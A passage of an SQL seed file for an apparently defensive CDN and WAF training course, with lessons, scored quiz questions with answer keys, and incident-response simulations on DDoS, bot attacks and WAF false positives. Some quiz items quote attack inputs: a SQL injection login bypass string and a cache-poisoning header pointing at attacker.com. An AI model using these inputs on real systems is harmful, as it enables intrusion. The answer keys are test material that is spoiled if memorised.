- **Circuit breakers**: Prevent cascade failures
- **Capacity planning**: Proactive scaling',
'["Diagnose origin issues", "Implement failover", "Communicate effectively"]',
'["Serve stale content during outages", "Failover to backup origin", "Diagnose root cause systematically", "Communicate clearly", "Plan for redundancy"]',
NULL,
'[24,26,41]'),

-- Day 48
('Traffic Spike Analysis', 'traffic-spike-analysis', 4, 'Real-time Incident Handling', 48, 10, 'advanced',
'# Traffic Spike Analysis

Is it marketing success or attack?

## Initial Assessment (5 min)

### Metrics to Check
```
Current vs baseline:
- Total requests: 10x
- Unique IPs: 3x
- Cache hit ratio: 90% (normal)
- Error rate: 0.5% (normal)
- Geographic distribution: Normal pattern
```

## Distinguishing Legitimate vs Attack

### Legitimate Traffic Signals
- **Gradual increase**: Ramps up over time
- **High cache hit**: Users browsing
- **Normal bounce rate**: Users engaging
- **Diverse IPs**: Many unique users
- **Known referrers**: Social media, marketing campaign
- **Expected**: Marketing team scheduled promotion

### Attack Traffic Signals
- **Sudden spike**: 0 to 100 in seconds
- **Low cache hit**: Targeting uncached endpoints
- **High bounce rate**: Not real users
- **Repeated IPs**: Botnet patterns
- **No referrer**: Direct access
- **Unexpected**: No scheduled event

## Decision Tree

### High cache hit + Diverse IPs + Expected event
= **Legitimate**, scale out

### Low cache hit + Repeated IPs + Unexpected
= **Attack**, enable rate limiting

### Mixed signals?
= **Investigate further**

## Response Strategies

### Legitimate Spike
```
1. Celebrate! Marketing working
2. Monitor capacity
3. Auto-scale if needed
4. Ensure good cache hit ratio
5. Prioritize critical flows (checkout)
```

### Attack Spike
```
1. Enable rate limiting
2. JS challenge
3. Block bad IPs/ASNs
4. Serve cached content aggressively
5. Contact CDN provider if needed
```

### Mixed/Uncertain
```
1. Monitor closely
2. Gradual mitigation (challenge, not block)
3. Analyze user behavior
4. Communicate with marketing team
5. Be ready to adjust
```

## Common Scenarios

### Black Friday Sale
Legitimate, expected spike
**Action**: Scale, optimize, celebrate

### Product Launch
Legitimate, might break records
**Action**: Pre-warm cache, scale proactively

### Sudden Unexplained Spike at 3 AM
Probably attack
**Action**: Rate limit, investigate

### Spike on Single Expensive Endpoint
Probably abuse
**Action**: Endpoint-specific rate limit

## Post-Analysis
- **Document**: What happened
- **Metrics**: Peak traffic, duration
- **Response**: What worked, what didn''t
- **Improvements**: Better detection, faster response',
'["Distinguish legitimate from malicious traffic", "Respond appropriately", "Avoid blocking real users"]',
'["Check cache hit ratio", "Look for referrers", "Gradual = legit, sudden = attack", "Mixed signals = investigate", "Don''t panic"]',
NULL,
'[29,41,42]'),

-- Day 49
('Bot Attack Bypass Attempt', 'bot-bypass-attempt', 4, 'Real-time Incident Handling', 49, 14, 'advanced',
'# Bot Attack Bypass Attempt

Sophisticated bots evading detection.

## Detection
- Bot traffic continuing despite JS challenge
- CAPTCHA solved at scale
- Bots mimicking human behavior
- Attack distributed across many IPs
- User-Agents rotating

## Analysis (15 min)

### Check Bypass Methods
```
# JS Challenge bypass
→ Bots using headless browsers (Puppeteer, Selenium)
→ Detection: Check for WebDriver, automation flags

# CAPTCHA bypass
→ CAPTCHA solving services (2Captcha, Anti-Captcha)
→ Detection: Solving speed (too fast), success patterns

# IP rotation
→ Using proxies, VPNs, residential IPs
→ Detection: Behavioral analysis, TLS fingerprinting

# User-Agent rotation
→ Cycling through legitimate User-Agents
→ Detection: User-Agent alone insufficient

# Cookie acceptance
→ Bots storing/replaying cookies
→ Detection: Token expiry, device fingerprinting
```

## Response Steps

### 1. Upgrade Detection (30 min)
```
Enable advanced signals:

# TLS Fingerprinting
Check JA3 hash against known bot signatures

# Behavioral Analysis
- Mouse movements: Required
- Keystroke timing: Monitored
- Session patterns: Analyzed

# Device Fingerprinting
Canvas + WebGL + Audio fingerprint

# Proof of Work
Require CPU work (HashCash)
```

### 2. Adaptive Challenges
```
Scoring system:
0-20: Block immediately
21-40: Proof of work
41-60: Difficult CAPTCHA
61-80: Easy CAPTCHA
81-100: Allow
```

### 3. Identify Bot Infrastructure
```
# Check for patterns
Same ASN, subnet, cloud provider?

# Threat intelligence
Check against known bot networks

# Registration patterns
New accounts created recently?
```

### 4. Targeted Mitigation
```
# Block identified infrastructure
Block ASN if concentrated attack

# Rate limit harder
Reduce limits for suspicious scores

# Require additional auth
MFA for sensitive actions
```

### 5. Long-term Strategies
```
# ML-based detection
Train model on legitimate vs bot behavior

# Honeypots
Hidden fields/links only bots interact with

# Time-based tokens
Tokens valid for 60 seconds only

# Progressive delays
Increase delay for repeated suspicious behavior
```

## Sophisticated Bot Techniques

### Residential Proxies
Use real user IPs
**Detection**: Behavioral analysis, device fingerprinting

### Browser Automation
Headless Chrome with anti-detection
**Detection**: WebDriver checks, Canvas fingerprint

### Account Takeover
Use stolen credentials
**Detection**: Login behavior, device change

### Low-and-Slow
Mimic human speed
**Detection**: Long-term behavioral patterns

## Response Philosophy
**Cat and mouse game**
- Bots evolve, so must detection
- Layer multiple signals
- No single silver bullet
- Continuous monitoring and adjustment

## Communication
- **Security team**: Share intelligence
- **Industry peers**: Collaborate on threats
- **Vendors**: Report to bot management providers
- **Users**: Apologize for any friction introduced',
'["Detect advanced bot bypasses", "Upgrade detection methods", "Apply layered defenses"]',
'["Bots are getting sophisticated", "JS challenge alone insufficient", "Use multiple signals", "Behavioral analysis powerful", "Continuous evolution required"]',
NULL,
'[39,43,45]'),

-- Day 50
('Incident Post-Mortem Best Practices', 'incident-postmortem', 4, 'Real-time Incident Handling', 50, 12, 'advanced',
'# Incident Post-Mortem

Learning from incidents to improve.

## Post-Mortem Goals
1. **Understand** what happened
2. **Learn** how to prevent recurrence
3. **Improve** processes and systems
4. **Share** knowledge across team

## Blameless Culture
**Focus on systems, not people**
- Human error is expected
- Systems should catch errors
- Blame prevents learning

## Post-Mortem Structure

### 1. Incident Summary
```
Title: DDoS Attack on API Endpoints
Date: 2024-01-15
Duration: 2 hours 15 minutes
Severity: P1 (High)
Impact: 25% of API requests failed
```

### 2. Timeline
```
14:00 - Alert: API error rate spike detected
14:05 - Confirmed DDoS attack in progress
14:10 - Enabled rate limiting (100 req/sec per IP)
14:15 - Attack continues, upgraded to JS challenge
14:30 - Attack subsiding, monitoring closely
14:45 - False positives reported for mobile users
15:00 - Created exception for mobile User-Agents
15:30 - Attack fully mitigated
16:15 - All mitigations removed, normal operation
```

### 3. Root Cause
```
What: HTTP flood targeting /api/search endpoint
Why: Endpoint had no rate limiting
How: Botnet of 10,000+ IPs
Why vulnerable: API launched 2 days ago without rate limits
```

### 4. Impact Assessment
```
Users affected: ~50,000 (25% of active users)
Revenue impact: $5,000 (failed checkouts)
Reputation: 15 negative social media mentions
Engineering time: 10 person-hours
```

### 5. What Went Well
```
✓ Detection: Alert fired within 2 minutes
✓ Response time: Mitigation started within 10 minutes
✓ Communication: Status page updated promptly
✓ Teamwork: Cross-functional coordination effective
```

### 6. What Went Wrong
```
✗ Prevention: No rate limiting on new API endpoint
✗ Testing: Attack scenario not tested pre-launch
✗ Documentation: No runbook for API-specific DDoS
✗ Monitoring: No alert for new endpoint traffic spike
```

### 7. Action Items
```
MUST FIX (do immediately):
[ ] Add rate limiting to ALL API endpoints (Owner: Alice, Due: 2024-01-17)
[ ] Create API DDoS runbook (Owner: Bob, Due: 2024-01-20)
[ ] Add traffic spike alerts for all endpoints (Owner: Charlie, Due: 2024-01-18)

SHOULD FIX (important):
[ ] Implement API endpoint launch checklist (Owner: Alice, Due: 2024-01-25)
[ ] Add API DDoS testing to pre-launch testing (Owner: Bob, Due: 2024-02-01)
[ ] Improve rate limiting UX (clearer error messages) (Owner: Dana, Due: 2024-02-15)

NICE TO HAVE:
[ ] Explore ML-based API abuse detection (Owner: Charlie, Due: 2024-03-01)
[ ] Dashboard for API-specific metrics (Owner: Dana, Due: 2024-03-15)
```

### 8. Lessons Learned
```
1. Rate limiting should be default for all new APIs
2. Pre-launch security checklist needs expansion
3. Mobile User-Agents need special handling
4. Status page communication was effective
5. DDoS runbooks need to be endpoint-specific
```

## Post-Mortem Meeting
- **When**: Within 48 hours of resolution
- **Who**: All incident responders + stakeholders
- **Duration**: 60-90 minutes
- **Focus**: Learning, not blame

## Follow-Up
- **Track action items**: Weekly review until complete
- **Share widely**: With entire engineering org
- **Update documentation**: Runbooks, processes
- **Celebrate improvements**: When action items complete

## Key Principles
1. **Blameless**: Focus on systems
2. **Actionable**: Concrete next steps
3. **Honest**: Acknowledge mistakes
4. **Timely**: Fresh memories
5. **Comprehensive**: Full timeline
6. **Shared**: Distribute learnings',
'["Conduct effective post-mortems", "Create actionable improvements", "Foster blameless culture"]',
'["Post-mortem is for learning", "Blameless culture essential", "Timeline is critical", "Action items must have owners", "Share learnings widely", "Track completion"]',
NULL,
'[20,41,42,43,44,45,46,47,48,49]');


-- =====================================================
-- QUIZ QUESTIONS (200+ questions across all lessons)
-- =====================================================

-- Sample quiz questions for each phase (representative set)
-- In production, you'd have 4-5 questions per lesson = 200+ total

-- Phase 0 Quiz Questions
INSERT INTO quiz_questions (lesson_id, question_type, question_text, options, correct_answers, explanation, difficulty, points) VALUES
(1, 'mcq', 'Which OSI layer is responsible for end-to-end communication and reliability?', '["Physical", "Data Link", "Network", "Transport", "Application"]', '[3]', 'The Transport layer (Layer 4) handles end-to-end communication, flow control, and reliability through protocols like TCP and UDP.', 'easy', 10),
(1, 'mcq', 'A SYN flood attack targets which OSI layer?', '["Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)", "Layer 2 (Data Link)"]', '[1]', 'SYN floods target Layer 4 (Transport layer) by exploiting the TCP three-way handshake process.', 'medium', 10),
(1, 'multiple_correct', 'Which layers are most commonly targeted by modern cyber attacks? (Select all that apply)', '["Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)", "Layer 1 (Physical)"]', '[0,1,2]', 'Layers 3, 4, and 7 are most commonly attacked. Layer 3: IP spoofing. Layer 4: SYN floods. Layer 7: HTTP floods, application exploits.', 'medium', 15),

(2, 'mcq', 'Which protocol provides reliable, ordered delivery of data?', '["UDP", "TCP", "ICMP", "ARP"]', '[1]', 'TCP (Transmission Control Protocol) provides reliable, ordered delivery through acknowledgments, retransmission, and flow control.', 'easy', 10),
(2, 'mcq', 'What is the primary advantage of UDP over TCP?', '["Reliability", "Speed", "Ordered delivery", "Error correction"]', '[1]', 'UDP is faster than TCP because it has no handshake, no acknowledgments, and lower overhead. Use for real-time applications where speed > reliability.', 'easy', 10),

(5, 'mcq', 'DNS poisoning attacks exploit which vulnerability?', '["Weak encryption", "Lack of authentication", "Buffer overflow", "SQL injection"]', '[1]', 'DNS poisoning exploits the lack of authentication in traditional DNS, allowing attackers to inject fake records. DNSSEC adds authentication.', 'medium', 10),
(5, 'scenario', 'You notice thousands of DNS queries for random subdomains. What attack is likely occurring?', '["DNS Amplification", "DNS Tunneling", "DNS Poisoning", "DDoS via DNS"]', '[1]', 'Random subdomain queries suggest DNS tunneling - using DNS to exfiltrate data or establish C2 communication by encoding data in DNS queries.', 'hard', 15),

(7, 'mcq', 'What does the "S" in HTTPS stand for?', '["Safe", "Secure", "Socket", "System"]', '[1]', 'HTTPS stands for HTTP Secure. The "S" indicates TLS/SSL encryption is used to secure the connection.', 'easy', 10),
(7, 'mcq', 'Which TLS version should be considered minimum for security?', '["SSL 3.0", "TLS 1.0", "TLS 1.1", "TLS 1.2"]', '[3]', 'TLS 1.2 is the minimum recommended version. SSL 3.0, TLS 1.0, and TLS 1.1 have known vulnerabilities and should be disabled.', 'medium', 10),

-- Phase 1 Quiz Questions
(11, 'mcq', 'Which part of the CIA triad does encryption primarily protect?', '["Confidentiality", "Integrity", "Availability", "All of the above"]', '[0]', 'Encryption primarily protects Confidentiality by preventing unauthorized access to data. Hashing protects Integrity. Redundancy protects Availability.', 'easy', 10),
(11, 'multiple_correct', 'Which threats target Availability? (Select all)', '["DDoS attacks", "Ransomware", "Data exfiltration", "Resource exhaustion"]', '[0,1,3]', 'DDoS, ransomware, and resource exhaustion all target Availability by making systems inaccessible. Data exfiltration targets Confidentiality.', 'medium', 15),

(13, 'mcq', 'According to OWASP Top 10 2021, what is the #1 web application risk?', '["Injection", "Broken Access Control", "XSS", "CSRF"]', '[1]', 'Broken Access Control is #1 in OWASP Top 10 2021, moving up from #5 in 2017. It occurs when users can access unauthorized resources.', 'medium', 10),
(13, 'scenario', 'A user changes their user_id parameter in the URL and sees another user\'s data. What vulnerability is this?', '["XSS", "Broken Access Control", "SQL Injection", "CSRF"]', '[1]', 'This is Broken Access Control (specifically IDOR - Insecure Direct Object Reference). The application fails to verify the user owns the requested resource.', 'medium', 15),

(15, 'mcq', 'Which header prevents XSS by restricting script sources?', '["X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection", "Strict-Transport-Security"]', '[1]', 'Content-Security-Policy (CSP) prevents XSS by controlling which sources can load scripts, styles, and other resources.', 'medium', 10),
(15, 'mcq', 'What is the difference between reflected and stored XSS?', '["Location of payload", "Severity of impact", "Browser affected", "Type of script"]', '[0]', 'Reflected XSS payload is in the request (URL) and executed immediately. Stored XSS payload is saved to database and executed when viewed by others.', 'medium', 10),

(16, 'mcq', 'What is the primary defense against SQL injection?', '["Input validation", "WAF", "Parameterized queries", "Encryption"]', '[2]', 'Parameterized queries (prepared statements) are the primary defense. They treat input as data, never as SQL code. Input validation and WAF add layers.', 'medium', 10),
(16, 'short_answer', 'What SQL clause would make "admin\' OR \'1\'=\'1" bypass authentication?', '["OR", "or"]', '[0,1]', 'The OR clause combined with the always-true condition \'1\'=\'1\' makes the WHERE clause always true, bypassing authentication.', 'medium', 10),

(20, 'mcq', 'What is the first phase of incident response?', '["Identification", "Preparation", "Containment", "Eradication"]', '[1]', 'Preparation is the first phase. You must have IR plan, team, tools, and monitoring BEFORE an incident occurs.', 'easy', 10),
(20, 'multiple_correct', 'Which metrics measure incident response effectiveness? (Select all)', '["MTTD (Mean Time to Detect)", "MTTR (Mean Time to Respond)", "Dwell Time", "All of the above"]', '[0,1,2,3]', 'All three metrics are critical: MTTD (how fast you detect), MTTR (how fast you respond), and Dwell Time (how long attacker stays undetected).', 'medium', 15),

-- Phase 2 Quiz Questions
(21, 'mcq', 'What is the primary benefit of a CDN?', '["Security", "Low latency", "Cost savings", "Analytics"]', '[1]', 'The primary benefit is low latency by serving content from geographically distributed edge servers close to users. Security and cost are secondary benefits.', 'easy', 10),
(21, 'mcq', 'Where does a CDN cache content?', '["Origin server", "Edge nodes (PoPs)", "User browser", "DNS servers"]', '[1]', 'CDNs cache content at edge nodes (Points of Presence) distributed globally to serve users from nearby locations.', 'easy', 10),

(22, 'mcq', 'What does TTL control in caching?', '["Time To Live - how long content is cached", "Total Transfer Limit", "Transport Layer Length", "Token Time Limit"]', '[0]', 'TTL (Time To Live) controls how long content stays cached before it must be revalidated or refetched from origin.', 'easy', 10),
(22, 'scenario', 'You set Cache-Control: max-age=3600, s-maxage=86400. How long will CDN cache vs browser?', '["Browser: 1 hour, CDN: 1 hour", "Browser: 1 day, CDN: 1 day", "Browser: 1 hour, CDN: 1 day", "Browser: 1 day, CDN: 1 hour"]', '[2]', 's-maxage overrides max-age for shared caches (CDN). So CDN caches for 1 day (86400s) while browsers cache for 1 hour (3600s).', 'hard', 15),

(24, 'mcq', 'Why should origin IP addresses never be exposed publicly?', '["Performance", "Compliance", "Attackers can bypass CDN protection", "Cost"]', '[2]', 'If origin IP is exposed, attackers can bypass the CDN and attack the origin directly, defeating DDoS protection and WAF rules.', 'medium', 10),
(24, 'multiple_correct', 'Which techniques protect origin servers? (Select all)', '["IP whitelisting", "Origin Shield", "Rate limiting at edge", "All of the above"]', '[0,1,2,3]', 'All techniques protect origins: IP whitelisting (only allow CDN), Origin Shield (additional caching), rate limiting (reduce traffic).', 'medium', 15),

(28, 'mcq', 'What is web cache poisoning?', '["Caching malware", "Injecting malicious content into CDN cache", "Deleting cached files", "Overloading cache servers"]', '[1]', 'Web cache poisoning is injecting malicious content into the CDN cache so it\'s served to all users requesting that resource.', 'medium', 10),
(28, 'scenario', 'You send X-Forwarded-Host: attacker.com and the response includes attacker.com link, which gets cached. What vulnerability?', '["XSS", "Cache Poisoning", "SSRF", "Open Redirect"]', '[1]', 'This is cache poisoning via unkeyed header. The X-Forwarded-Host isn\'t in the cache key, so the poisoned response is served to all users.', 'hard', 15),

-- Phase 3 Quiz Questions
(31, 'mcq', 'What is the primary purpose of a WAF?', '["Block all traffic", "Filter malicious HTTP requests", "Encrypt traffic", "Load balancing"]', '[1]', 'A WAF (Web Application Firewall) filters HTTP traffic, blocking malicious requests while allowing legitimate ones based on rules.', 'easy', 10),
(31, 'mcq', 'What is the difference between positive and negative security models?', '["Allow known good vs Block known bad", "Active vs Passive", "Cloud vs On-prem", "Encrypted vs Unencrypted"]', '[0]', 'Negative security (blacklist) blocks known bad patterns (default allow). Positive security (whitelist) allows only known good (default block).', 'medium', 10),

(33, 'mcq', 'What is a JavaScript challenge used for?', '["Detect bots", "Encrypt traffic", "Validate forms", "Improve performance"]', '[0]', 'JavaScript challenges detect bots. Real browsers execute JS and return correct response. Simple bots without JS engines fail.', 'easy', 10),
(33, 'multiple_correct', 'Which techniques detect bots? (Select all)', '["User-Agent analysis", "JavaScript challenge", "CAPTCHA", "Behavioral analysis", "All of the above"]', '[0,1,2,3,4]', 'All techniques help detect bots. Best practice is layering multiple signals rather than relying on one method.', 'medium', 15),

(34, 'mcq', 'What is BOLA in API security?', '["Broken Object Level Authorization", "Bot Level Attack", "Backend Overload Attack", "Broken OAuth Login"]', '[0]', 'BOLA (Broken Object Level Authorization) is when API fails to verify user owns the object they\'re accessing (e.g., accessing another user\'s order).', 'medium', 10),
(34, 'scenario', 'An API returns user email, SSN, and password hash. What OWASP API risk?', '["Broken Authentication", "Excessive Data Exposure", "Lack of Resources", "Mass Assignment"]', '[1]', 'Excessive Data Exposure - API returns more data than needed. Should only return necessary fields (id, name), not sensitive data (SSN, password hash).', 'medium', 15),

(36, 'mcq', 'Which layer does a SYN flood attack target?', '["Layer 3", "Layer 4", "Layer 7", "All layers"]', '[1]', 'SYN flood targets Layer 4 (Transport) by sending SYN packets without completing the three-way handshake, exhausting server connection tables.', 'medium', 10),
(36, 'mcq', 'What is DNS amplification?', '["Making DNS queries larger", "Using open resolvers to amplify attack traffic", "Amplifying DNS security", "Increasing DNS cache"]', '[1]', 'DNS amplification sends small queries to open DNS resolvers with spoofed source IP, generating large responses to victim (50x-100x amplification).', 'hard', 10),

(38, 'mcq', 'What is the recommended expiration time for JWT access tokens?', '["24 hours", "1 hour", "15 minutes", "7 days"]', '[2]', '15 minutes is recommended for access tokens. If compromised, damage is limited. Use refresh tokens (7 days) to get new access tokens.', 'medium', 10),
(38, 'mcq', 'What is the "alg: none" vulnerability in JWT?', '["No algorithm specified", "Accepting unsigned tokens", "Algorithm confusion", "Weak algorithm"]', '[1]', 'The "alg: none" vulnerability allows unsigned tokens to be accepted. Attacker sets algorithm to "none" and removes signature, forging tokens.', 'hard', 10),

-- Phase 4 Quiz Questions (Incident Response)
(41, 'mcq', 'What should you do first when an incident is detected?', '["Fix it immediately", "Triage and assess severity", "Notify all users", "Rollback last deploy"]', '[1]', 'Triage first! Assess: What, When, Where, Who, Impact. This determines priority and appropriate response. Acting without assessment can make things worse.', 'medium', 10),
(41, 'scenario', 'You detect unusual traffic at 2 AM. What information do you gather first?', '["Fix WAF rules", "Traffic source, pattern, affected systems, user impact", "Restart servers", "Call all engineers"]', '[1]', 'Gather intelligence first: traffic sources (IPs, countries), patterns (repetitive?), affected systems (all/partial?), user impact (who/how many?).', 'medium', 15),

(42, 'mcq', 'During a DDoS attack, what should you enable first at the CDN?', '["Rate limiting", "Cache purge", "Origin restart", "Maintenance page"]', '[0]', 'Enable rate limiting first to reduce malicious traffic reaching origin. Then analyze attack and apply additional mitigations (challenges, blocking).', 'medium', 10),
(42, 'scenario', 'DDoS attack targets /api/search endpoint. After rate limiting, attack continues. Next step?', '["Give up", "Endpoint-specific rate limit + cache aggressively", "Take site offline", "Do nothing"]', '[1]', 'Apply endpoint-specific, stricter rate limit to /api/search. Cache responses aggressively (even dynamic content temporarily). Monitor and adjust.', 'hard', 15),

(43, 'mcq', 'What characterizes credential stuffing attacks?', '["High login success rate", "Low login success rate with many attempts", "Single IP source", "Slow and careful"]', '[1]', 'Credential stuffing has LOW success rate (1-5%) because attackers test many stolen credentials. High volume, distributed IPs, repetitive User-Agents.', 'medium', 10),
(43, 'scenario', 'After a credential stuffing attack, what should you do for compromised accounts?', '["Nothing", "Force password reset + invalidate sessions + notify user", "Ban the accounts", "Delete user data"]', '[1]', 'Force password reset, invalidate all sessions, email user about suspicious activity, and encourage MFA. Protect users, don\'t punish them.', 'medium', 15),

(44, 'mcq', 'What is a false positive in WAF context?', '["Legitimate request blocked", "Attack not detected", "Server error", "Cache miss"]', '[0]', 'False positive is when WAF blocks a legitimate request (e.g., search query triggers SQL injection rule). Tune WAF to reduce these.', 'easy', 10),
(44, 'scenario', 'WAF blocks checkout page. What do you do first?', '["Disable WAF completely", "Create specific exception for checkout", "Ignore it", "Block more traffic"]', '[1]', 'Create a specific exception for the checkout path/rule combination. DON\'T disable WAF completely - that removes all protection. Document the exception.', 'medium', 15),

(47, 'mcq', 'Origin server is down. What should CDN do?', '["Return 502 error", "Serve stale cached content", "Redirect to competitor", "Show blank page"]', '[1]', 'Serve stale cached content using stale-while-revalidate or stale-if-error. Keeps site partially functional while origin recovers.', 'medium', 10),

(50, 'mcq', 'What is the goal of a post-mortem?', '["Assign blame", "Learn and improve", "Punish mistakes", "Cover up the incident"]', '[1]', 'Post-mortems are for learning and improving systems/processes. Blameless culture focuses on systems, not people. Blame prevents learning.', 'easy', 10),
(50, 'multiple_correct', 'What should a good post-mortem include? (Select all)', '["Timeline", "Root cause", "Action items with owners", "All of the above"]', '[0,1,2,3]', 'All are essential: detailed timeline, root cause analysis, and concrete action items with owners and due dates.', 'medium', 15);



-- =====================================================
-- INCIDENT SCENARIOS (10 simulations)
-- =====================================================

INSERT INTO incident_scenarios (title, slug, category, difficulty, description, initial_state, decision_points, optimal_path, learning_objectives, time_limit_min, required_phase) VALUES

-- Incident 1: Credential Stuffing
('Credential Stuffing Attack on Login', 'credential-stuffing-01', 'credential_stuffing', 'intermediate',
'You notice a massive spike in login attempts. Failed login rate is 97%. Multiple IPs involved. Users are reporting account lockouts.',
'{"time": "03:15 AM", "metrics": {"login_attempts_per_min": 5000, "normal_baseline": 50, "failed_rate": 0.97, "unique_ips": 12000, "successful_logins": 150}, "alerts": ["Login endpoint: 100x traffic spike", "WAF: Repetitive User-Agents detected", "Support: 25 account lockout tickets"], "context": "Black Friday sale started yesterday. Site traffic is high but legitimate."}',
'[
  {
    "id": "detect",
    "question": "What is your first action?",
    "options": [
      {"id": "block_all", "text": "Block all login attempts", "score": 0, "feedback": "Too aggressive - blocks legitimate users during peak sales period.", "next": null, "outcome": "failure"},
      {"id": "investigate", "text": "Check metrics: attempt rate, IP distribution, User-Agents, success rate", "score": 100, "feedback": "Correct! Gather data to confirm it''s an attack before acting.", "next": "confirm"},
      {"id": "ignore", "text": "Ignore - probably just Black Friday traffic", "score": 0, "feedback": "Dangerous assumption. The 97% fail rate and 100x spike indicate attack.", "next": null, "outcome": "failure"},
      {"id": "restart", "text": "Restart login servers", "score": 20, "feedback": "Won''t help - attack continues after restart. Need targeted mitigation.", "next": "confirm"}
    ]
  },
  {
    "id": "confirm",
    "question": "Metrics confirm credential stuffing: 97% fail rate, distributed IPs, repetitive User-Agents. What do you implement first?",
    "options": [
      {"id": "rate_limit", "text": "Rate limiting: 5 login attempts per IP per minute + 3 per username per hour", "score": 100, "feedback": "Excellent! Rate limiting stops the attack while allowing legitimate users.", "next": "protect"},
      {"id": "captcha_all", "text": "Require CAPTCHA for all login attempts", "score": 60, "feedback": "Works but hurts UX during peak sales. Better after failed attempts.", "next": "protect"},
      {"id": "disable_login", "text": "Temporarily disable login", "score": 20, "feedback": "Too extreme - prevents legitimate users from logging in to purchase.", "next": "protect"},
      {"id": "email_all", "text": "Email all users to change passwords", "score": 40, "feedback": "Premature - causes panic. First stop attack, then protect compromised accounts.", "next": "protect"}
    ]
  },
  {
    "id": "protect",
    "question": "Attack is contained. You identify 150 successful logins during the attack. What next?",
    "options": [
      {"id": "force_reset", "text": "Force password reset + invalidate sessions + notify affected users + enable MFA", "score": 100, "feedback": "Perfect! Comprehensive protection for compromised accounts.", "next": null, "outcome": "success"},
      {"id": "monitor_only", "text": "Just monitor those accounts", "score": 30, "feedback": "Insufficient - compromised accounts need immediate protection.", "next": null, "outcome": "partial"},
      {"id": "ban_accounts", "text": "Permanently ban the 150 accounts", "score": 0, "feedback": "Wrong - these are victims, not attackers. Protect them, don''t punish.", "next": null, "outcome": "failure"},
      {"id": "nothing", "text": "Do nothing - attack stopped", "score": 0, "feedback": "Dangerous - compromised accounts can be used for fraud, data theft, etc.", "next": null, "outcome": "failure"}
    ]
  }
]',
'["detect", "rate_limit", "force_reset"]',
'["Detect credential stuffing patterns", "Apply rate limiting", "Protect compromised accounts", "Balance security and UX"]',
15, 3),

-- Incident 2: DDoS Attack
('HTTP Flood DDoS Attack', 'ddos-http-flood-01', 'ddos', 'intermediate',
'Traffic spiked 50x normal. Origin CPU at 100%. Users reporting slow site. Attack targets homepage and product pages.',
'{"time": "14:30", "metrics": {"requests_per_sec": 50000, "normal_baseline": 1000, "origin_cpu": 100, "origin_memory": 95, "cache_hit_ratio": 0.45, "error_rate_5xx": 0.15}, "alerts": ["Origin health check failing", "Response time P95: 15 seconds", "CDN: Traffic spike detected"], "context": "No marketing campaign scheduled. Attack appears to be HTTP GET flood from botnet."}',
'[
  {
    "id": "assess",
    "question": "How do you confirm this is a DDoS attack?",
    "options": [
      {"id": "check_patterns", "text": "Check: Traffic sources (distributed?), patterns (repetitive?), cache hit ratio (low?), legitimate users affected?", "score": 100, "feedback": "Correct! Gather evidence: distributed IPs, repetitive requests, low cache hit = DDoS.", "next": "mitigate"},
      {"id": "assume_legit", "text": "Assume it''s legitimate traffic and scale up", "score": 20, "feedback": "Costly mistake - scaling won''t help against DDoS. Confirm first.", "next": "mitigate"},
      {"id": "block_all", "text": "Block all traffic immediately", "score": 0, "feedback": "Too extreme - blocks legitimate users. Need targeted approach.", "next": null, "outcome": "failure"}
    ]
  },
  {
    "id": "mitigate",
    "question": "Confirmed DDoS. What is your first mitigation?",
    "options": [
      {"id": "rate_limit_challenge", "text": "Enable aggressive rate limiting (100 req/sec per IP) + JS challenge", "score": 100, "feedback": "Excellent! Rate limiting + challenge stops bots while allowing humans.", "next": "optimize"},
      {"id": "cache_only", "text": "Increase cache TTL", "score": 40, "feedback": "Helps but insufficient alone. Need rate limiting + challenge to stop attack.", "next": "optimize"},
      {"id": "take_offline", "text": "Take site offline", "score": 0, "feedback": "Defeats the purpose - attacker wins. Use CDN protections to stay online.", "next": null, "outcome": "failure"}
    ]
  },
  {
    "id": "optimize",
    "question": "Attack traffic reduced 80%. Origin still stressed. What else do you do?",
    "options": [
      {"id": "cache_aggressive", "text": "Cache everything aggressively (even dynamic content temporarily) + enable stale-while-revalidate", "score": 100, "feedback": "Perfect! Serve from cache to reduce origin load while maintaining availability.", "next": null, "outcome": "success"},
      {"id": "restart_origin", "text": "Restart origin servers", "score": 30, "feedback": "Temporary relief but doesn''t address root cause. Cache aggressively instead.", "next": null, "outcome": "partial"},
      {"id": "wait", "text": "Wait for attack to end", "score": 20, "feedback": "Passive approach risks prolonged outage. Take active measures.", "next": null, "outcome": "partial"}
    ]
  }
]',
'["check_patterns", "rate_limit_challenge", "cache_aggressive"]',
'["Detect DDoS patterns", "Apply rate limiting and challenges", "Leverage caching", "Protect origin"]',
15, 3),

-- Incident 3: False Positive
('WAF False Positive Blocking Checkout', 'false-positive-checkout-01', 'false_positive', 'intermediate',
'Support tickets spiking: "Can''t complete checkout". Revenue dropped 30%. WAF logs show blocks on /checkout endpoint.',
'{"time": "11:00 AM", "metrics": {"support_tickets": 150, "revenue_drop": 0.30, "checkout_completion_rate": 0.15, "normal_rate": 0.65, "waf_blocks": 2500}, "alerts": ["Support: Checkout broken for mobile users", "Revenue alert: 30% drop", "WAF: Rule 942100 (SQLi) triggered 2500 times on /checkout"], "context": "New checkout form deployed this morning with updated payment fields."}',
'[
  {
    "id": "identify",
    "question": "What do you check first in WAF logs?",
    "options": [
      {"id": "analyze_logs", "text": "Which rule triggered? What input caused it? Which users affected (mobile/desktop, all/subset)?", "score": 100, "feedback": "Correct! Identify the specific rule, input pattern, and user segment.", "next": "fix"},
      {"id": "disable_waf", "text": "Disable WAF completely", "score": 0, "feedback": "Nuclear option - removes all protection. Never do this.", "next": null, "outcome": "failure"},
      {"id": "ignore", "text": "Ignore - users will figure it out", "score": 0, "feedback": "Unacceptable - losing 30% revenue and hurting customer experience.", "next": null, "outcome": "failure"}
    ]
  },
  {
    "id": "fix",
    "question": "Found: SQLi rule triggers on credit card field with spaces (e.g., '4111 1111 1111 1111'). What do you do?",
    "options": [
      {"id": "exception", "text": "Create exception: Skip rule 942100 for /checkout POST requests + add input validation", "score": 100, "feedback": "Perfect! Specific exception + validation balances security and functionality.", "next": "verify"},
      {"id": "disable_rule", "text": "Disable SQLi rule 942100 globally", "score": 20, "feedback": "Too broad - removes SQLi protection everywhere. Create specific exception instead.", "next": "verify"},
      {"id": "remove_spaces", "text": "Tell users not to use spaces in credit card numbers", "score": 10, "feedback": "Bad UX - users expect spaces to work. Fix the WAF, not user behavior.", "next": "verify"}
    ]
  },
  {
    "id": "verify",
    "question": "Exception applied. How do you verify the fix?",
    "options": [
